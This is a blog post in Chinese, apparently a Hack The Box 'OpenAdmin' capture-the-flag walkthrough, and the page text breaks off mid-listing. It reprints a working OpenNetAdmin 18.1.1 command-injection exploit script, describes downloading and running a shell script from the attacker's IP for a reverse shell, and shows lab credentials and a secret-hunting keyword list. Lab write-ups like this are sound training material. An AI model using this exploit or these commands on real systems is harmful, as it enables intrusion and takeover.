@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="OpenNetAdmin v18.1.1,Password Reuse,Local Port Exploit,Crack id_rsa,sudo,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介1.端口扫描2.WEB目录、URI枚举3.Linux信息收集4.Crack id_rsa5.sudoers misconfig 靶机状态：rooted.">
+<meta name="keywords" content="OpenNetAdmin v18.1.1,Password Reuse,Local Port Exploit,Crack id_rsa,sudo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Linux OpenAdmin">
+<meta property="og:url" content="https://exexute.github.io/2020/01/11/HTB-Linux-OpenAdmin/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介1.端口扫描2.WEB目录、URI枚举3.Linux信息收集4.Crack id_rsa5.sudoers misconfig 靶机状态：rooted.">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://exexute.github.io/2020/01/11/HTB-Linux-OpenAdmin/htb_openadmin_nano_cmd.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.084Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB Linux OpenAdmin">
+<meta name="twitter:description" content="简介1.端口扫描2.WEB目录、URI枚举3.Linux信息收集4.Crack id_rsa5.sudoers misconfig 靶机状态：rooted.">
+<meta name="twitter:image" content="https://exexute.github.io/2020/01/11/HTB-Linux-OpenAdmin/htb_openadmin_nano_cmd.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2020/01/11/HTB-Linux-OpenAdmin/">
+
+
+
+
+
+  <title>HTB Linux OpenAdmin | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2020/01/11/HTB-Linux-OpenAdmin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB Linux OpenAdmin</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-11T09:52:55+08:00">
+                2020-01-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>1.端口扫描<br>2.WEB目录、URI枚举<br>3.Linux信息收集<br>4.Crack id_rsa<br>5.sudoers misconfig</p>
+<p>靶机状态：rooted.</p>
+<a id="more"></a>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>端口扫描</strong><br>扫描开放的端口、服务和对应的版本，然后查找对应版本是否存在N Day可直接利用<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">./owef.sh OpenAdmin 10.10.10.171</span><br><span class="line">22,80</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-09 13:41 CST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos:</span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.10.10.171)</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-csrf: Couldn<span class="string">'t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">'t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 177.13 seconds</span></span><br></pre></td></tr></table></figure></p>
+<p>结果分析：</p>
+<ul>
+<li>22端口，ssh服务，OpenSSh 7.6p1</li>
+<li>80端口，http服务，Apache httpd 2.4.29<br>这两个服务无可可利用的RCE，开始看http服务</li>
+</ul>
+<p><strong>目录枚举、url枚举、手动审计</strong></p>
+<p>枚举目录之后找到one目录，访问ona之后，从页面的download和here两处连接中找到opennetadmin的超链接，标识了ona是opennetadmin系统a，版本为18.1.1，于是，查找opennetadmin系统是否存在N Day，发现2019年爆出登陆接口的<a href="https://www.exploit-db.com/exploits/47691" target="_blank" rel="noopener">远程命令执行（RCE）</a>。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">URL=<span class="string">"<span class="variable">$&#123;1&#125;</span>"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span></span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"$ "</span>; <span class="built_in">read</span> cmd</span><br><span class="line"> curl --silent -d <span class="string">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";<span class="variable">$&#123;cmd&#125;</span>;echo \"END\"&amp;xajaxargs[]=ping"</span> <span class="string">"<span class="variable">$&#123;URL&#125;</span>"</span> | sed -n -e <span class="string">'/BEGIN/,/END/ p'</span> | tail -n +2 | head -n -1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
+<p>从exp中可以看出登陆接口的<code>xajaxargs[]</code>接口存在操作系统命令注入，于是通过bp抓包，修改xajaxargs[]参数值，通过<code>wget 10.10.14.39/shell.sh</code>和<code>bash shell.sh</code>拿到反弹shell.</p>
+<h3 id="user-jimmy"><a href="#user-jimmy" class="headerlink" title="user: jimmy"></a>user: jimmy</h3><p><strong>os信息收集</strong><br>1.查看sudoers配置：<code>sudo -l</code>，发现不存在；</p>
+<p>2.查看系统内核：<code>uname -a</code>，返回结果“Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux”，内核版本4.15.0，暂时不存在提权漏洞；</p>
+<p>3.查看WEB目录下包含关键字的文件，关键字列表为”password、passwd、token、secret、db_login、db_passwd”等，找到”database_settings.inc.php”文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ona_contexts=<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'DEFAULT'</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'databases'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt;</span><br><span class="line">      <span class="keyword">array</span> (</span><br><span class="line">        <span class="string">'db_type'</span> =&gt; <span class="string">'mysqli'</span>,</span><br><span class="line">        <span class="string">'db_host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">        <span class="string">'db_login'</span> =&gt; <span class="string">'ona_sys'</span>,</span><br><span class="line">        <span class="string">'db_passwd'</span> =&gt; <span class="string">'n1nj4W4rri0R!'</span>,</span><br><span class="line">        <span class="string">'db_database'</span> =&gt; <span class="string">'ona_default'</span>,</span><br><span class="line">        <span class="string">'db_debug'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'description'</span> =&gt; <span class="string">'Default data context'</span>,</span><br><span class="line">    <span class="string">'context_color'</span> =&gt; <span class="string">'#D3DBFF'</span>,</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>找到一组账号密码：”ona_sys : n1nj4W4rri0R!”</p>
+<p>4.查看系统用户，<code>cat /etc/passwd</code>发现”root”、”jimmy”、”jooanna”三个用户，尝试用上面找到的密码登陆ssh，最后用jimmy登陆ssh；</p>
+<h3 id="user-joanna"><a href="#user-joanna" class="headerlink" title="user: joanna"></a>user: joanna</h3><p><strong>新思路</strong> 如果内核、计划任务、文件、服务、进程、常规端口都没有思路，可以看看是否存在本地监听的非常规端口，通过telnet探测，检测这些端口对应的服务内容；</p>
+<p><strong>信息收集</strong><br>通过linpeas.sh搜集系统信息，并没有发现可利用的内容，然后在forum上看到大佬们的tips，查看端口，然后注意到本地监听了一个52846的端口，telnet探测，发现是http服务，于是用curl查看页面内容：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:~$ curl  127.0.0.1:52846</span><br></pre></td></tr></table></figure></p>
+<p>响应如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">   // error_reporting(E_ALL);</span><br><span class="line">   // ini_set(&quot;display_errors&quot;, 1);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang = &quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Tutorialspoint.com&lt;/title&gt;</span><br><span class="line">      &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;style&gt;</span><br><span class="line">         body &#123;</span><br><span class="line">            padding-top: 40px;</span><br><span class="line">            padding-bottom: 40px;</span><br><span class="line">            background-color: #ADABAB;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin &#123;</span><br><span class="line">            max-width: 330px;</span><br><span class="line">            padding: 15px;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            color: #017572;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin .form-signin-heading,</span><br><span class="line">         .form-signin .checkbox &#123;</span><br><span class="line">            margin-bottom: 10px;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin .checkbox &#123;</span><br><span class="line">            font-weight: normal;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin .form-control &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">            height: auto;</span><br><span class="line">            -webkit-box-sizing: border-box;</span><br><span class="line">            -moz-box-sizing: border-box;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin .form-control:focus &#123;</span><br><span class="line">            z-index: 2;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin input[type=&quot;email&quot;] &#123;</span><br><span class="line">            margin-bottom: -1px;</span><br><span class="line">            border-bottom-right-radius: 0;</span><br><span class="line">            border-bottom-left-radius: 0;</span><br><span class="line">            border-color:#017572;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin input[type=&quot;password&quot;] &#123;</span><br><span class="line">            margin-bottom: 10px;</span><br><span class="line">            border-top-left-radius: 0;</span><br><span class="line">            border-top-right-radius: 0;</span><br><span class="line">            border-color:#017572;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         h2&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: #017572;</span><br><span class="line">         &#125;</span><br><span class="line">      &lt;/style&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line"></span><br><span class="line">      &lt;h2&gt;Enter Username and Password&lt;/h2&gt;</span><br><span class="line">      &lt;div class = &quot;container form-signin&quot;&gt;</span><br><span class="line">        &lt;h2 class=&quot;featurette-heading&quot;&gt;Login Restricted.&lt;span class=&quot;text-muted&quot;&gt;&lt;/span&gt;&lt;/h2&gt;</span><br><span class="line">                &lt;/div&gt; &lt;!-- /container --&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class = &quot;container&quot;&gt;</span><br><span class="line"></span><br><span class="line">         &lt;form class = &quot;form-signin&quot; role = &quot;form&quot;</span><br><span class="line">            action = &quot;/index.php&quot; method = &quot;post&quot;&gt;</span><br><span class="line">            &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;/h4&gt;</span><br><span class="line">            &lt;input type = &quot;text&quot; class = &quot;form-control&quot;</span><br><span class="line">               name = &quot;username&quot;</span><br><span class="line">               required autofocus&gt;&lt;/br&gt;</span><br><span class="line">            &lt;input type = &quot;password&quot; class = &quot;form-control&quot;</span><br><span class="line">               name = &quot;password&quot; required&gt;</span><br><span class="line">            &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot;</span><br><span class="line">               name = &quot;login&quot;&gt;Login&lt;/button&gt;</span><br><span class="line">         &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现这是一个新的登陆页面，存在index.php文件，于是搜索index.php文件，查找文件源码所在位置：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:~$ find / -name  <span class="string">"index.php"</span>  2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>响应如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/var/www/internal/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/js/extensions/<span class="built_in">source</span>/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/js/extensions/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/js/<span class="built_in">source</span>/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/js/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/assets/svg/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/css/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/fonts/pe-icon-7-stroke/css/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/fonts/pe-icon-7-stroke/fonts/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/fonts/pe-icon-7-stroke/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/fonts/revicons/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/fonts/font-awesome/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/fonts/index.php</span><br><span class="line">/var/www/html/sierra/vendors/revolution/index.php</span><br></pre></td></tr></table></figure></p>
+<p>留意到一个不再html中的index.php，应该就是这个，查看如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   ob_start();</span><br><span class="line">   session_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">   <span class="comment">// error_reporting(E_ALL);</span></span><br><span class="line">   <span class="comment">// ini_set("display_errors", 1);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html lang = <span class="string">"en"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Tutorialspoint.com&lt;/title&gt;</span><br><span class="line">      &lt;link href = <span class="string">"css/bootstrap.min.css"</span> rel = <span class="string">"stylesheet"</span>&gt;</span><br><span class="line"></span><br><span class="line">      &lt;style&gt;</span><br><span class="line">         body &#123;</span><br><span class="line">            padding-top: <span class="number">40</span>px;</span><br><span class="line">            padding-bottom: <span class="number">40</span>px;</span><br><span class="line">            background-color: <span class="comment">#ADABAB;</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin &#123;</span><br><span class="line">            max-width: <span class="number">330</span>px;</span><br><span class="line">            padding: <span class="number">15</span>px;</span><br><span class="line">            margin: <span class="number">0</span> auto;</span><br><span class="line">            color: <span class="comment">#017572;</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin .form-signin-heading,</span><br><span class="line">         .form-signin .checkbox &#123;</span><br><span class="line">            margin-bottom: <span class="number">10</span>px;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin .checkbox &#123;</span><br><span class="line">            font-weight: normal;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin 